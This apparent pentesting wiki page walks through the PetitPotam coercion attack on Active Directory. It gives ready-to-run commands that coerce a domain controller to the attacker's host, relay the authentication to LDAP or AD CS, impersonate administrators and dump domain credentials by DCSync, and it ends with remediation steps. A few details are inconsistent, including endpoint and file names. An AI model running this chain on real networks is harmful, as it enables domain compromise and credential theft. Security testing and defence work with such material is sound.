---
layout: default
title: PetitPotam [CVE-2022-26925]
parent: Active Directory
nav_order: 14
permalink: /ad/petitpotam/
---

# PetitPotam [CVE-2022-26925]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

As explained in [topotam's Github repository](https://github.com/topotam/PetitPotam), PetitPotam is an exploit that allow to *to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions*. The authentication can then be [relayed](/ad/ntlmrelay/) on domain services depending on the Net-NTLM version caught.

## Prerequisites

- If the domain is correctly patched, a low privileged domain account. Otherwise, **the attack can be performed unauthenticated**.

## Exploit

To check if a domain controller is vulnerable to PetitPotam, use [NetExec](https://github.com/Pennyw0rth/NetExec) appropriate module.

```bash
# Check PetitPotam vulnerability unauthenticated.
nxc smb $DomainControllerIP -M petitpotam

# Check PetitPotam vulnerability as an authenticated domain user.
nxc smb $DomainControllerIP -u $Username -p $Password -M petitpotam
```

If the domain controller appears to be vulnerable, you can use [topotam's Github repository](https://github.com/topotam/PetitPotam) to exploit it, forcing the domain controller to authenticate on your host. Before that, start [Responder](https://github.com/lgandx/Responder) to catch the NTLM authentication on your host.

```bash
sudo responder -I $NetworkInterface
python PetitPotam.py -d $Domain -u $Username -p $Password $LHost $DomainControllerIP
```

At this point, you can attempt to [crack](/cracking/) the hash obtained, whatever its version. But you might not get any result, since machine accounts' passwords are usually complex and randomly generated passwords.

Otherwise, depending on the Net-NTLM version caught, you can try the two following exploits.

### Net-NTLMv1

{: .important }
> If this one does not work, take a look at the [Net-NTLMv2](/ad/petitpotam/#net-ntlmv2) attack. It could also work with Net-NTLMv1 response.

If you catch a Net-NTLMv1 response, it could be [relayed](/ad/ntlmrelay/) to the domain controller itself - *or a replicated one* - to authenticate on LDAP(S) service. Normally, it's not possible to relay an authentication response from SMB to LDAP because of NTLM MIC (Message Integrity Check). But if the domain controller is vulnerable to Drop The MIC \[CVE-2019-1040\], you could be able to do it anyway.

The goal of this attack is to delegate rights to impersonate any user - *even domain administrators* - to a machine account you own. It can either be:
* The machine account of a domain computer you fully compromised.
* If the [MachineAccountQuota](/ad/quota/) is > 0, a machine account you will create. 

```bash
# Relay the domain controller authentication to itself or another domain controller.
# It will create a new machine account with a random password and delegate access to it.
impacket-ntlmrelayx -t ldap://$TargetDomainControllerIP -smb2support --delegate-access --remove-mic

# If you already have compromised a machine account and MachineAccountQuota = 0, use this.
impacket-ntlmrelayx -t ldap://$TargetDomainControllerIP -smb2support --delegate-access --remove-mic --escalate-user "$MachineAccount$"

# Now, coerce the authentication on your host with PetitPotam.
python PetitPotam.py -d $Domain -u $Username -p $Password $LHost $CoercedDomainControllerIP
```

If the attack worked, you can now leverage delegate access rights to impersonate any domain user - *remember, even domain administrators*.

```bash
impacket-getST -spn cifs/$TargetDomainControllerFQDN $Domain/$MachineAccount$:$Password -impersonate $Username
```

Previous command should generate a file named `$Username.cache` you can use as `KRB5CCNAME` to authenticate through Kerberos with impersonated user. Once the variable exported, you can perform a [DCSync attack](/ad/dcsync/) with `-k` and `-no-pass` option to invoke Kerberos authentication.

```bash
export KRB5CCNAME=$Username.ccache
impacket-secretsdump -k -no-pass $TargetDomainControllerIP
```

### Net-NTLMv2

If you catch a Net-NTLMv2 response, the only way to exploit it is to leverage the AD CS (Active Directory Certificate Services). Following requirements are necessary to continue:
* Certificate Authority Web Enrollment is enabled.
* It accepts NTLM authentication.

Note that Certificate Authority Web Enrollement should be on the AD CS server - *which is sometimes the domain controller itself, sometimes a different server* -. To find the Certificate Authority Web Enrollment endpoint, following methods are possible:
* Network scans.
* Active Directory enumeration, looking for `*ADCS*`, `*CA*`, etc. named computers.
* Fuzzing on `/certsrv/` endpoint.
* Using `certutil.exe`.
* Using [Certify](https://github.com/GhostPack/Certify).

The Certificate Authority Web Enrollment endpoint is accessible by clicking on `Request a certificate`, usually located at `/cert/certrqus.asp`.

If all conditions above are met, start an [NTLM relay](/ad/ntlmrelay/) to the AD CS server. Then, coerce the vulnerable domain controller one more time with PetitPotam exploit to force the authentication on your host.

```bash
impacket-ntlmrelayx -t http://$CertificateAuthorityServerIP/certsrv/certqus.asp -smb2support --adcs --template DomainController

python PetitPotam.py -d $Domain -u $Username -p $Password $LHost $DomainControllerIP
```

You should receive a base64 formatted certificate. You can use it to request a Kerberos TGT with Rubeus.

```powershell
# With Win+R, to avoid conflicts with your current Kerberos context.
runas /netonly /user:fake powershell

# Then, use Rubeus to extract. Don't forget to put a '$' at the end of the domain controller account.
.\Rubeus.exe asktgt /outfile:kirbi /user:$DomainControllerName$ /ptt /certificate:$Base64EncodedCertificate

# Verify the Kerberos TGT is loaded in the session.
klist
```

With a Kerberos TGT associated to the domain controller’s account, you are now able to fully compromise the domain. For instance, you can perform a [DCSync attack](/ad/dcsync/).

## Recommendations

Microsoft is aware of this vulnerability, but no official security patch has been released to correct it. Various Microsoft recommendations already exist to protect domain controllers against NTLM relay attacks.

- [ ]  Update domain controllers to the latest Microsoft security patches to ensure PetitPotam isn’t exploitable unauthenticated.
- [ ]  Disable the Certificate Authority Web Enrollment endpoint, or at least the NTLM authentication on it to avoid NTLM relay on it.
- [ ]  Disable NTLM authentication on the Domain to enforce Kerberos usage (**it could have impacts on applications that does not support Kerberos authentication**).
- [ ] Disable Net-NTLMv1 to enforce Net-NTLMv2. 
- [ ] Apply Microsoft recommendations described in [KB5005413](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429).